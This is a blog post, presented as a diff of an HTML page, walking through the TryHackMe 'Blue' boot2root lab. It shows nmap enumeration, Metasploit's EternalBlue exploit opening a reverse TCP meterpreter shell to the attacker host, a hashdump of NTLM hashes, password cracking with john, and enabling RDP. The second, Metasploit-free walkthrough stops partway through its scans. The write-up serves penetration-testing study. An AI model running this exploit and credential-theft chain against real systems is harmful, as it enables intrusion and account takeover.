@@ -1,0 +1,518 @@
+<!doctype html><html lang=en-us><head><title>Blue Boot2Root Write-Up</title><style>html body{font-family:Lato,sans-serif;background-color:#fff}:root{--accent:red;--border-width:5px}</style><link rel=stylesheet href=/css/main.css><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Lato"><link rel=stylesheet href=//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/solarized-dark.min.css><link rel=stylesheet href=https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css integrity=sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u crossorigin=anonymous><link rel=stylesheet href=https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css integrity=sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN crossorigin=anonymous><script src=//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js></script><script src=//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/go.min.js></script><script src=//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/haskell.min.js></script><script src=//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/kotlin.min.js></script><script src=//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/scala.min.js></script><script src=//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/yaml.min.js></script><script src=//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/dockerfile.min.js></script><script>hljs.initHighlightingOnLoad()</script><script src=https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js></script><script src=https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js integrity=sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa crossorigin=anonymous></script><meta name=generator content="Hugo 0.83.1"><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta property="og:title" content="Blue Boot2Root Write-Up"><meta property="og:url" content="https://packetfire.org/post/blue-boot2-root-writeup/"><meta property="og:description" content="A boot2root writeup of the Blue host from TryHackMe"><meta property="og:image" content="https://packetfire.org/img/pf-logo.png"><meta property="twitter:card" content="summary"><meta property="twitter:title" content="Blue Boot2Root Write-Up"><meta property="twitter:description" content="A boot2root writeup of the Blue host from TryHackMe"><meta property="twitter:image" content="https://packetfire.org/img/pf-logo.png"></head><body><nav class="navbar navbar-default navbar-fixed-top"><div class=container><div class=navbar-header><a class="navbar-brand visible-xs" href=#>Blue Boot2Root Write-Up</a>
+<button class=navbar-toggle data-target=.navbar-collapse data-toggle=collapse>
+<span class=icon-bar></span><span class=icon-bar></span><span class=icon-bar></span></button></div><div class="collapse navbar-collapse"><ul class="nav navbar-nav"><li><a href=/>Home</a></li><li><a href=/post/>Posts</a></li><li><a href=/project/>Projects</a></li><li><a href=/about/>About</a></li></ul><ul class="nav navbar-nav navbar-right"><li class=navbar-icon><a href=mailto:ncatelli@packetfire.org><i class="fa fa-envelope-o"></i></a></li></ul></div></div></nav><main><div class=item><h4><a href=/post/blue-boot2-root-writeup/>Blue Boot2Root Write-Up</a></h4><h5><a href=https://packetfire.org/author/nate-catelli>Nate Catelli</a></h5><h5>A boot2root writeup of the Blue host from TryHackMe</h5><h5>November 11, 2020</h5><a href=https://packetfire.org/tags/ctf><kbd class=item-tag>ctf</kbd></a><a href=https://packetfire.org/tags/boot2root><kbd class=item-tag>boot2root</kbd></a><a href=https://packetfire.org/tags/hacking><kbd class=item-tag>hacking</kbd></a><a href=https://packetfire.org/tags/writeup><kbd class=item-tag>writeup</kbd></a><a href=https://packetfire.org/tags/tryhackme><kbd class=item-tag>tryhackme</kbd></a></div><br><div class=text-justify><h2 id=introduction>Introduction:</h2><p>After participating in the Disney Can-You-Hack-It CTF, I&rsquo;ve been trying to spend more of my time studying security and offensive penetration testing. My main goal is to balance understanding how to effectively perform an attack with the awesome frameworks out there like metasploit while gaining a better understanding of what this framework is doing under the hood. This post is the first of many that will follow me documenting both the attacks and my methodologies.</p><h2 id=environment>Environment</h2><p>Both attacks take place in a flat network consisting of my attack host, which is a freshly-booted Kali Linux livecd, and the the target host, a freshly-booted Windows VM that I knew contained 3 flags to capture. No other information is known about the host, like what it&rsquo;s running or its OS version, but I would be lying if I said I didn&rsquo;t assume that this would be an eternalblue attack based off the name.</p><h2 id=attacking-blue-with-metasploit>Attacking Blue with Metasploit</h2><p>I started the attack by opening a tmux session and starting meterpreter with <code>msfdb run</code> to spin up a postgres instance for persisting scans and recon data.</p><h3 id=host-enumeration>Host enumeration</h3><p>Given that I was investigating a single host, and that I had an unfair suspicion of what kind of attack vector I would be looking for, I started with a default script and service version scan.</p><pre><code>msf5 &gt; db_nmap -sV -sC -Pn 10.10.201.83
+[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-11 01:53 UTC
+[*] Nmap: Nmap scan report for ip-10-10-201-83.eu-west-1.compute.internal (10.10.201.83)
+[*] Nmap: Host is up (0.00053s latency).
+[*] Nmap: Not shown: 991 closed ports
+[*] Nmap: PORT      STATE SERVICE      VERSION
+[*] Nmap: 135/tcp   open  msrpc        Microsoft Windows RPC
+[*] Nmap: 139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+[*] Nmap: 445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)n  tcpwrapped
+[*] Nmap: |_ssl-date: 2020-11-11T01:55:05+00:00; 0s from scanner time.
+[*] Nmap: 49152/tcp open  msrpc        Microsoft Windows RPC
+[*] Nmap: 49153/tcp open  msrpc        Microsoft Windows RPC
+[*] Nmap: 49154/tcp open  msrpc        Microsoft Windows RPC
+[*] Nmap: 49158/tcp open  msrpc        Microsoft Windows RPC
+[*] Nmap: 49160/tcp open  msrpc        Microsoft Windows RPC
+[*] Nmap: MAC Address: 02:B5:23:84:9D:19 (Unknown)
+[*] Nmap: Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+[*] Nmap: Host script results:
+[*] Nmap: |_clock-skew: mean: 1h29m59s, deviation: 3h00m00s, median: 0s
+[*] Nmap: |_nbstat: NetBIOS name: JON-PC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 02:b5:23:84:9d:19 (unknown)mb-os-discovery:
+[*] Nmap: |   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
+[*] Nmap: |   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+[*] Nmap: |   Computer name: Jon-PC
+[*] Nmap: |   NetBIOS computer name: JON-PC\x00
+[*] Nmap: |   Workgroup: WORKGROUP\x00
+[*] Nmap: |_  System time: 2020-11-10T19:54:50-06:00
+[*] Nmap: | smb-security-mode:
+[*] Nmap: |   account_used: guest
+[*] Nmap: |   authentication_level: user
+[*] Nmap: |   challenge_response: supported
+[*] Nmap: |_  message_signing: disabled (dangerous, but default)
+[*] Nmap: | smb2-security-mode:
+[*] Nmap: |   2.02:
+[*] Nmap: |_    Message signing enabled but not required
+[*] Nmap: | smb2-time:
+[*] Nmap: |   date: 2020-11-11T01:54:50
+[*] Nmap: |_  start_date: 2020-11-11T01:51:00
+[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 140.63 seconds
+</code></pre><p>This initial scan began to confirm my suspicions that this was an eternalblue attack since it looked like the host was a Windows 7 Service Pack 1 machine with SMB available. In addition, this ended up leaking a potential username as the computer&rsquo;s name, which was worth keeping in mind as a potential administrative user going forward. Additionally this pointed out relaxed security setting in the smb service&rsquo;s configuration.</p><p>With the information I collected so far, I decided to probe a little further into SMB with an enumaration using nmap&rsquo;s <code>smb-enum-shares</code> scripts.</p><pre><code>msf5 &gt; db_nmap --script smb-enum-shares  -p 445 10.10.201.83
+[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-11 01:58 UTC
+[*] Nmap: Nmap scan report for ip-10-10-201-83.eu-west-1.compute.internal (10.10.201.83)
+[*] Nmap: Host is up (0.00020s latency).
+[*] Nmap: PORT    STATE SERVICE
+[*] Nmap: 445/tcp open  microsoft-ds
+[*] Nmap: MAC Address: 02:B5:23:84:9D:19 (Unknown)
+[*] Nmap: Host script results:
+[*] Nmap: | smb-enum-shares:
+[*] Nmap: |   note: ERROR: Enumerating shares failed, guessing at common ones (NT_STATUS_ACCESS_DENIED) |   account_used: &lt;blank&gt;
+[*] Nmap: |   \\10.10.201.83\ADMIN$:
+[*] Nmap: |     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
+[*] Nmap: |     Anonymous access: &lt;none&gt;
+[*] Nmap: |   \\10.10.201.83\C$:
+[*] Nmap: |     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
+[*] Nmap: |     Anonymous access: &lt;none&gt;
+[*] Nmap: |   \\10.10.201.83\IPC$:
+[*] Nmap: |     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
+[*] Nmap: |_    Anonymous access: READ
+[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 0.85 seconds
+</code></pre><p>This indicated anonymous read access on the IPC share, another piece of evidence pointing to eternalblue as being the attack vector. With this information, I decided I should kick off a quick vuln scan with <code>nmap</code> to see if it would infact identify eternalblue. Which it quickly did, as <code>ms17-010</code>.</p><pre><code>msf5 &gt; db_nmap --script vuln  -p 445 10.10.201.83
+[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-11 02:03 UTC
+[*] Nmap: Nmap scan report for ip-10-10-201-83.eu-west-1.compute.internal (10.10.201.83)
+[*] Nmap: Host is up (0.00046s latency).
+[*] Nmap: PORT    STATE SERVICE
+[*] Nmap: 445/tcp open  microsoft-ds
+[*] Nmap: |_clamav-exec: ERROR: Script execution failed (use -d to debug)
+[*] Nmap: MAC Address: 02:B5:23:84:9D:19 (Unknown)
+[*] Nmap: Host script results:
+[*] Nmap: |_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
+[*] Nmap: |_smb-vuln-ms10-054: false
+[*] Nmap: |_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
+[*] Nmap: | smb-vuln-ms17-010:
+[*] Nmap: |   VULNERABLE:
+[*] Nmap: |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+[*] Nmap: |     State: VULNERABLE
+[*] Nmap: |     IDs:  CVE:CVE-2017-0143
+[*] Nmap: |     Risk factor: HIGH
+[*] Nmap: |       A critical remote code execution vulnerability exists in Microsoft SMBv1
+[*] Nmap: |        servers (ms17-010).
+[*] Nmap: |
+[*] Nmap: |     Disclosure date: 2017-03-14
+[*] Nmap: |     References:
+[*] Nmap: |       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+[*] Nmap: |       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+[*] Nmap: |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 15.51 seconds
+</code></pre><p>I now had a potential attack vector to explore, but I decided to do a quick recap of the services on the host to make sure I didn&rsquo;t miss anything. This was crucial because I had overlooked an open RDP port, which ended up being important later in the attack.</p><pre><code>msf5 &gt; services 
+Services
+========
+
+host          port   proto  name           state  info
+----          ----   -----  ----           -----  ----
+10.10.201.83  135    tcp    msrpc          open   Microsoft Windows RPC
+10.10.201.83  139    tcp    netbios-ssn    open   Microsoft Windows netbios-ssn
+10.10.201.83  445    tcp    microsoft-ds   open   Windows 7 Professional 7601 Service Pack 1 microsoft-ds workgroup: WORKGROUP
+10.10.201.83  3389   tcp    ms-wbt-server  open   
+10.10.201.83  49152  tcp    unknown        open   Microsoft Windows RPC
+10.10.201.83  49153  tcp    unknown        open   Microsoft Windows RPC
+10.10.201.83  49154  tcp    unknown        open   Microsoft Windows RPC
+10.10.201.83  49158  tcp    unknown        open   Microsoft Windows RPC
+10.10.201.83  49160  tcp    unknown        open   Microsoft Windows RPC
+</code></pre><h3 id=preparing-the-attack>Preparing the attack</h3><p>The first step was to check if there were any exploits available for <code>ms17-010</code></p><pre><code>msf5 &gt; search ms17-010
+
+Matching Modules
+================
+
+   #  Name                                           Disclosure Date  Rank     Check  Description
+   -  ----                                           ---------------  ----     -----  -----------
+   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
+   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
+   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
+
+
+Interact with a module by name or index, for example use 5 or use exploit/windows/smb/smb_doublepulsar_rce
+</code></pre><p>Since previous scans pointed to the target OS being windows 7, the second option in the list seemed like a perfect candidate.</p><pre><code>msf5 &gt; use 2
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; setg RHOSTS 10.10.201.83
+RHOSTS =&gt; 10.10.201.83
+msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; show options
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS         10.10.201.83     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.10.100.83     yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
+</code></pre><p>I left the default payload as the staged reverse TCP shell, and kicked off an attack to see if I could get a shell.</p><pre><code>msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; run -j
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 10.10.100.83:4444 
+[*] 10.10.201.83:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 10.10.201.83:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+[*] 10.10.201.83:445      - Scanned 1 of 1 hosts (100% complete)
+[*] 10.10.201.83:445 - Connecting to target for exploitation.
+[+] 10.10.201.83:445 - Connection established for exploitation.
+[+] 10.10.201.83:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 10.10.201.83:445 - CORE raw buffer dump (42 bytes)
+[*] 10.10.201.83:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
+[*] 10.10.201.83:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
+[*] 10.10.201.83:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
+[+] 10.10.201.83:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 10.10.201.83:445 - Trying exploit with 12 Groom Allocations.
+[*] 10.10.201.83:445 - Sending all but last fragment of exploit packet
+[*] 10.10.201.83:445 - Starting non-paged pool grooming
+[+] 10.10.201.83:445 - Sending SMBv2 buffers
+[+] 10.10.201.83:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 10.10.201.83:445 - Sending final SMBv2 buffers.
+[*] 10.10.201.83:445 - Sending last fragment of exploit packet!
+[*] 10.10.201.83:445 - Receiving response from exploit packet
+[+] 10.10.201.83:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 10.10.201.83:445 - Sending egg to corrupted connection.
+[*] 10.10.201.83:445 - Triggering free of corrupted buffer.
+[*] Sending stage (201283 bytes) to 10.10.201.83
+[*] Meterpreter session 1 opened (10.10.100.83:4444 -&gt; 10.10.201.83:49198) at 2020-11-11 02:08:15 +0000
+[+] 10.10.201.83:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.201.83:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.201.83:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+</code></pre><pre><code>msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; sessions -i 1 
+[*] Starting interaction with 1...
+
+meterpreter &gt; getuid 
+Server username: NT AUTHORITY\SYSTEM
+</code></pre><p>SUCCESS! And it left me with <code>NT AUTHORITY\SYSTEM</code> credentials. At this point the machine was mine, but I had to make sure that I had a stable foothold on the machine before proceeding to search for flags.</p><h3 id=foothold>Foothold</h3><p>The first step was making sure my shell on the host was stable. So I checked my pid and looked to see if I could migrate it to something like the print spooler.</p><pre><code>meterpreter &gt; getpid 
+Current pid: 1304
+meterpreter &gt; ps
+
+Process List
+============
+
+ PID   PPID  Name                  Arch  Session  User                          Path
+ 492   708   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           
+ 560   552   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.execorsvw.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe    NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exes.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exenlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.execes.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exem.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exesvchost.exe           x64   0        NT AUTHORITY\SYSTEM           
+ 900   708   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  
+ 948   708   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    
+ 1016  660   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exeost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    
+ 1172  708   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  
+ 1304  708   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
+ 1340  708   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    
+ 1408  708   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
+ 1480  708   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
+ 1616  708   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
+ 1956  708   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  
+ 2060  708   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           
+ 2072  832   WmiPrvSE.exe                                                       
+ 2184  708   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    
+ 2220  708   mscorsvw.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe
+ 2496  708   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM           
+ 2548  708   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  
+ 2956  708   vds.exe               x64   0        NT AUTHORITY\SYSTEM           
+ 2996  708   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+</code></pre><p>Luckily for me it already looked like it was in the injected in the spool service so there was no need to proceed with a migration.</p><p>Even though I already knew where this host was running from deploying it, the ps output also established that this host was an EC2 instance via the <code>ssm-agent</code>, <code>LiteAgent</code> and <code>Ec2Config</code> processes. This could have also been observed in the nmap scans via the reverse dns lookup, but I thought it was worth calling out.</p><p>Confirmed again with a quick run of the <code>post/windows/gather/checkvm</code> module.</p><pre><code>meterpreter &gt; run post/windows/gather/checkvm 
+
+[*] Checking if JON-PC is a Virtual Machine ...
+[+] This is a Xen Virtual Machine
+</code></pre><p>Finally I grabbed a sysinfo output to confirm a bunch of information that I had already assumed or known.</p><pre><code>meterpreter &gt; sysinfo 
+Computer        : JON-PC
+OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 0
+Meterpreter     : x64/windows
+</code></pre><p>With all this information, I attempted to grab a hashdump to pivot from this shell to a longer-lived user.</p><pre><code>meterpreter &gt; hashdump 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+</code></pre><p>And of course, there is Jon. With our hashes and users, I dumped these credentials into a file and ran <code>john</code> against it with Kali&rsquo;s copy of the <code>rockyou.txt</code> password list.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~/ctf/blue# john --format<span style=color:#f92672>=</span>NT --wordlist<span style=color:#f92672>=</span>/usr/share/wordlists/rockyou.txt hash.txt 
+Created directory: /root/.john
+Using default input encoding: UTF-8
+Loaded <span style=color:#ae81ff>2</span> password hashes with no different salts <span style=color:#f92672>(</span>NT <span style=color:#f92672>[</span>MD4 256/256 AVX2 8x3<span style=color:#f92672>])</span>
+Warning: no OpenMP support <span style=color:#66d9ef>for</span> this hash type, consider --fork<span style=color:#f92672>=</span><span style=color:#ae81ff>2</span>
+Press <span style=color:#e6db74>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style=color:#66d9ef>for</span> status
+                 <span style=color:#f92672>(</span>Administrator<span style=color:#f92672>)</span>
+alqfna22         <span style=color:#f92672>(</span>Jon<span style=color:#f92672>)</span>
+2g 0:00:00:00 DONE <span style=color:#f92672>(</span>2020-11-11 02:23<span style=color:#f92672>)</span> 3.076g/s 15692Kp/s 15692Kc/s 15700KC/s alr19882006..alpusidi
+Warning: passwords printed above might not be all those cracked
+Use the <span style=color:#e6db74>&#34;--show --format=NT&#34;</span> options to display all of the cracked passwords reliably
+Session completed
+</code></pre></div><p>With the Jon user&rsquo;s password in hand, I ran the <code>post/windows/manage/enable_rdp</code> module and was quickly able to connect as the our Jon admin user.</p><pre><code>meterpreter &gt; run post/windows/manage/enable_rdp 
+
+[*] Enabling Remote Desktop
+[*]   RDP is already enabled
+[*] Setting Terminal Services service startup mode
+[*]   The Terminal Services service is not set to auto, changing it to auto ...
+[*]   Opening port in local firewall if necessary
+[*] For cleanup execute Meterpreter resource file: /root/.msf4/loot/20201111022704_default_10.10.201.83_host.windows.cle_997445.txt
+</code></pre><h3 id=wrapping-up>Wrapping up</h3><p>With a new shell I was able to find each of the 3 flags in fairly standard locations on the C:\ drive.</p><ul><li>C:\flag1.txt flag{access_the_machine}</li><li>C:\Windows\system32\config\flag2.txt flag{sam_database_elevated_access}</li><li>C:\Users\Jon\Documents\flag3.txt flag{admin_documents_can_be_valuable}</li></ul><h2 id=attacking-blue-without-metasploit>Attacking Blue without Metasploit</h2><p>Now that I had completed the initial attack, I wanted to retry it without the help of metasploit for sourcing, packing and executing the exploit. This imposed the restriction of not having the meterpreter shell to rely on.</p><p>Even though I now understood the attack and the host I decided to run through the motions of host enumeration again. For the sake of brevity, I&rsquo;ll avoid repeating some of the callouts unless there are differences with the first attack.</p><p>I started with the same nmap scan, the only difference being that I instead supplied <code>-oA $ATTACKTARGET</code> to output the results to the host with the target server&rsquo;s ip as a prefix. This functioned to make up for not having the results automatically persisted in <code>msfdb</code>.</p><pre><code>root@kali:~/ctf/scans# export ATTACKTARGET=10.10.87.38
+root@kali:~/ctf/scans# nmap -sV -sC -oA $ATTACKTARGET $ATTACKTARGET 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-11 02:45 UTC
+Nmap scan report for ip-10-10-87-38.eu-west-1.compute.internal (10.10.87.38)
+Host is up (0.00036s latency).
+Not shown: 991 closed ports
+PORT      STATE SERVICE        VERSION
+135/tcp   open  msrpc          Microsoft Windows RPC
+139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds   Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+3389/tcp  open  ms-wbt-server?
+|_ssl-date: 2020-11-11T02:47:18+00:00; 0s from scanner time.
+49152/tcp open  msrpc          Microsoft Windows RPC
+49153/tcp open  msrpc          Microsoft Windows RPC
+49154/tcp open  msrpc          Microsoft Windows RPC
+49158/tcp open  msrpc          Microsoft Windows RPC
+49160/tcp open  msrpc          Microsoft Windows RPC
+MAC Address: 02:FF:5C:EF:7E:F3 (Unknown)
+Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 1h30m00s, deviation: 3h00m00s, median: 0s
+|_nbstat: NetBIOS name: JON-PC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 02:ff:5c:ef:7e:f3 (unknown)
+| smb-os-discovery: 
+|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+|   Computer name: Jon-PC
+|   NetBIOS computer name: JON-PC\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2020-11-10T20:47:13-06:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2020-11-11T02:47:13
+|_  start_date: 2020-11-11T02:35:53
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 152.72 seconds
+</code></pre><pre><code>root@kali:~/ctf/scans# nmap --script smb-enum-shares,smb-enum-users -p 445 -oA &quot;$ATTACKTARGET_smb_enum&quot; $ATTACKTARGET 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-11 02:52 UTC
+Nmap scan report for ip-10-10-87-38.eu-west-1.compute.internal (10.10.87.38)
+Host is up (0.00077s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+MAC Address: 02:FF:5C:EF:7E:F3 (Unknown)
+
+Host script results:
+| smb-enum-shares: 
+|   note: ERROR: Enumerating shares failed, guessing at common ones (NT_STATUS_ACCESS_DENIED)
+|   account_used: &lt;blank&gt;
+|   \\10.10.87.38\ADMIN$: 
+|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
+|     Anonymous access: &lt;none&gt;
+|   \\10.10.87.38\C$: 
+|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
+|     Anonymous access: &lt;none&gt;
+|   \\10.10.87.38\IPC$: 
+|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
+|_    Anonymous access: READ
+
+Nmap done: 1 IP address (1 host up) scanned in 2.80 seconds
+</code></pre><pre><code>root@kali:~/ctf/scans# nmap --script vuln -p 445 -oA &quot;$ATTACKTARGET_smb_vuln&quot; $ATTACKTARGET 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-11 02:53 UTC
+Nmap scan report for ip-10-10-87-38.eu-west-1.compute.internal (10.10.87.38)
+Host is up (0.0011s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+MAC Address: 02:FF:5C:EF:7E:F3 (Unknown)
+
+Host script results:
+|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
